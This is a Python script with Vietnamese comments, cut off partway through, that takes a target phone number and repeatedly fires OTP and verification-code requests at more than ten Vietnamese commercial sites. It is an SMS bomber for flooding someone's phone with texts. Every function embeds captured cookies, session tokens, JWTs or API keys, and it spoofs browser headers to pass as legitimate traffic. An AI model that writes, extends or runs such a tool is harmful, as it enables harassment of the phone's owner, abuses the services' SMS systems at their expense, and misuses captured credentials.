import requests
import time
import sys
import urllib3
from colorama import Fore, Style, init
import concurrent.futures
import random
import string
def generate_random_email(domain='example.com'):
    # Tạo phần tên email ngẫu nhiên
    length = random.randint(5, 10)  # Độ dài của tên email từ 5 đến 10 ký tự
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    # Tạo phần tên miền email
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()
# Khởi tạo colorama để hỗ trợ màu sắc trong terminal
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs='/path/to/your/certificate-authority-bundle-file'
)

if len(sys.argv) != 3:
    print("Số lượng tham số không đúng")
    sys.exit()

sdt = sys.argv[1]
count = sys.argv[2]

print("Số điện thoại:", sdt)
print("Số lần lặp:", count)

count = int(count)

if count > 10:
    count = 15

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)

def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def beautybox():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '79d2b3f19c99f5f7fe5971dd8a8da10d',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721481506061',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEAUTYBOX | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEAUTYBOX | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
def kingfood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'domain': 'kingfoodmart',
        'origin': 'https://kingfoodmart.com',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AUh02gdJ2znItu66xz2_9BcBV9GpEJnBt2TLRjQR8E4oYUM8MOUaIzo9UIbYoR5iYCS1tFCgV-bXXo5aAhc4PphZgiMyaaKDNeC4MNyVDT5ME4_Sd-u0oY1gNPGS74QJAiRCJQ3aFU55oFpZpvKGID_msRlD:U=830229ce60000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    try:
        response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KINGFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KINGFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def batdongsan():
    cookies = {
        'con.ses.id': '7bf95af0-9d48-4115-b90e-bf7ae8469ee6',
        'con.unl.lat': '1721408400',
        'con.unl.sc': '1',
        '_cfuvid': '4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000',
        'cf_clearance': 'hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'cookie': 'con.ses.id=7bf95af0-9d48-4115-b90e-bf7ae8469ee6; con.unl.lat=1721408400; con.unl.sc=1; _cfuvid=4vKd4xe7hwURYq2xLeT9BVK.Jrz4BnjQuSRDUOM0vzA-1721486111747-0.0.1.1-604800000; cf_clearance=hiiEURQk2w.xUsuPjn9p3ROpbHXl.wlpUuq1cGtW_.g-1721486121-1.0.1.1-jbLYMcgpNKMTvY1HlNdTJzo8ICADE9v86yOh5Ulh15Xm.v0xqMTTlj15qkFRfERjSleLaNdqxOJCQTsz.cc7cA; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222072e9e1-089b-4e58-ae37-b33dc853a67e%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.6810435Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%2264679f44-f457-480b-ad8d-ce4e4c2ee26d%22%2C%22expireDate%22%3A%222025-07-20T21%3A35%3A23.681077Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22171c86d6-ae5f-e545-06ab-337ff9c892a2%22%2C%22c%22%3A1721486135674%2C%22l%22%3A1721486135674%7D',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.get(
            'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BATDONGSAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BATDONGSAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def futabus():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://futabus.vn',
        'priority': 'u=1, i',
        'referer': 'https://futabus.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6ImMxNTQwYWM3MWJiOTJhYTA2OTNjODI3MTkwYWNhYmU1YjA1NWNiZWMiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMTQ4NDE4NywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIxNDg0MTg3LCJleHAiOjE3MjE0ODc3ODcsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.B3N8aepeBJjblYxOhB3CWVrtNScR7v03lucgdln78cz2607XQDiYEOVWQ5ObwQkxfPrEEVrBNHeysfEffcXB0u2B2D6uEki1H1vKam3-ANzbMHQAuAHAsYdd8WJXaK-75tm4eQUtY9tkmdfbjTZqWY0J-_FylIIZ-KBTDIfxQObMFXdQvJNZ2eFwBFOG1-sV1z2xBLpzfHg94WwC21FAWGDh44UnrWoUTHHgUrUZH9y-y3SivWeln2Wl1VHoDjojJLq2ktO01JEmshb7K3zf9rloW8jTd-ZzHQzLEeqMbep8AUeqDslL7uHnz8AJ8V6udNxACirDi5dZ-4b6aj8uxA',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '44099e14-f741-4900-892f-1e8d7634a953',
        'use_for': 'LOGIN',
    }

    try:
        response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FUTABUS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FUTABUS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def galaxyplay():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI2YzY0MTgxMi00OTk0LTQyN2EtOWU2Zi0zZjdkYjE4NDE3M2YiLCJkaWQiOiI5MjlmYWM4Zi1kMzIwLTQ4NGEtYjBlMi0zNzM3ZGFiYzc0MzAiLCJpcCI6IjE3MS4yMjQuMTc3LjI0OSIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8bW9iaWxlfHdpbmRvd3N8MTB8b3BlcmEiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNzIxNDg5MzMxLCJleHAiOjE3MzcwNDEzMzF9.BO2W7U4Y9QBrqv_Vhr34OlQ003dseXM5sOYsJPl1DK4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GALAXYPLAY | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GALAXYPLAY | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hoangphuc():
    cookies = {
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'PHPSESSID': 'ac5e556aba621e003eea52e3ee2e7306',
        'form_key': 'foYNoUTBeSb3u9Ky',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-cache-sessid': 'true',
        'mst-cache-warmer-track': '1721490287753',
        'section_data_ids': '{}',
        'private_content_version': 'c54559f3c098d65d341757813fe12a5b',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; PHPSESSID=ac5e556aba621e003eea52e3ee2e7306; form_key=foYNoUTBeSb3u9Ky; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-cache-sessid=true; mst-cache-warmer-track=1721490287753; section_data_ids={}; private_content_version=c54559f3c098d65d341757813fe12a5b',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQxNzMwMTkiLCJhcCI6IjExMjAyMzc5NzIiLCJpZCI6ImFiODFhNzc0NWI0YjUzNzUiLCJ0ciI6IjZhMTE4Y2I3NTEzNDQ5NjU5NzZlMzM1NGRkMTlmYmY5IiwidGkiOjE3MjI4MjY1MTIwNzIsInRrIjoiMTMyMjg0MCJ9fQ==',
        'origin': 'https://hoang-phuc.com',
        'priority': 'u=1, i',
        'referer': 'https://hoang-phuc.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-6a118cb751344965976e3354dd19fbf9-ab81a7745b4b5375-01',
        'tracestate': '1322840@nr=0-1-4173019-1120237972-ab81a7745b4b5375----1722826512072',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-newrelic-id': 'UAcAUlZSARABVFlaBQYEVlUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
        'form_key': 'foYNoUTBeSb3u9Ky',
    }

    try:
        response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gumac():
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GUMAC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GUMAC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinamilk():
    cookies = {
        'ci_session': 'a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e',
        '__cf_bm': 'eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ',
        'builderSessionId': 'b4ba9b33e12b4b4080e44f971f201bbd',
        'sca_fg_codes': '[]',
        'avadaIsLogin': '',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        # 'cookie': 'ci_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221733ebe33c1b9f55c4134169d86b9cbd%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A11%3A%22172.20.10.5%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F126.0.0.0+Safari%2F537.36+OPR%2F112.%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1721490628%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7Dadfe5819f98e4f3730eadce196c8027e; __cf_bm=eFcHUYLAsJGc8AY_lYQFm5T_AqbsUr63KlJUExtfJXA-1721490650-1.0.1.1-JqKOUYynCzeIAa2X5kjEWahdrfZ6Gm2Jf7jhjcS7eQ0P9vmR8TV8x66.Q6pWzXxzR5elXqZ_JIQkwZHljknwVQ; builderSessionId=b4ba9b33e12b4b4080e44f971f201bbd; sca_fg_codes=[]; avadaIsLogin=',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = f'{{"type":"register","phone":"{sdt}"}}'

    try:
        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINAMILK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINAMILK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def speedlotte():
    cookies = {
        '__Host-next-auth.csrf-token': '28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61',
        '__Secure-next-auth.callback-url': 'https%3A%2F%2Fwww.lottemart.vn',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '__Host-next-auth.csrf-token=28d9fcfca28198873e9fe12de5d2f5a357dd4679f83316ccd6a84b17a33f2547%7C06a22f5c5af3f6669cfc95124b36be1c1454cd45a66b5bcda7444ff03a458b61; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn',
        'origin': 'https://www.lottemart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/vi-cgy',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'case': 'register',
    }

    try:
        response = requests.post(
            'https://www.lottemart.vn/v1/p/mart/bos/vi_cgy/V1/mart-sms/sendotp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SPEEDLOTTE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SPEEDLOTTE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def medicare():
    cookies = {
        'SERVER': 'nginx2',
        'XSRF-TOKEN': 'eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D',
        'medicare_session': 'eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        # 'Cookie': 'SERVER=nginx2; XSRF-TOKEN=eyJpdiI6Ii9RMTQrNk9RREZvWXF6UkdnTzM5M1E9PSIsInZhbHVlIjoiWmkzTHExeU1tNmFSM1ltczdpWU1Ec1hCZTROSXhzTEJVRDE2NXQ2NmVTR3lMQ1paS3NBSitwRllzVVNUUFB6WG1YNXdXSEJuOE1VZjQ4ZzE2WnBYUFRYVGFNT2NSTUhNYk1tWkhVdTZRa0gyRFVOM2g1WWdOeVFIWUxCMVY0Y2kiLCJtYWMiOiJhMzA4YWEyZTk5ZGEzZmY3ZTZiMTFjMTNhYTk4NzYyZjkxYTAyOWQyNDcyYTIxMGU2NDQ5MjVmNzc5ODgwZmUyIiwidGFnIjoiIn0%3D; medicare_session=eyJpdiI6Ii9Ma2NlZmZ1OVZPTDdxeitEOVVNT2c9PSIsInZhbHVlIjoiK0NhYXZtYjRBeHRwd1gvenMrblVGVEdrU0FKVW80bmptYnQvbHMzRzkvN1pyYjVmaEh3ZHdEYzlHb3V3djBvNjMyeTlKdUJzbTl0S2RwQkJwQkh0ejFrcEJXcnZUcGRDTEppdmp1MTJ6UDgzRk4zcUtKalpJVSt1RGhLdjd3OS8iLCJtYWMiOiI4ZjU1ZTZkNjc1NWM5Mjc3NjNkN2UxMTUzNWQ5YzUyYTY4N2I0NTQ1NTZiZWExOWViZjcwYjhmNWUxM2NlYjMyIiwidGFnIjoiIn0%3D',
        'Origin': 'https://medicare.vn',
        'Referer': 'https://medicare.vn/login',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
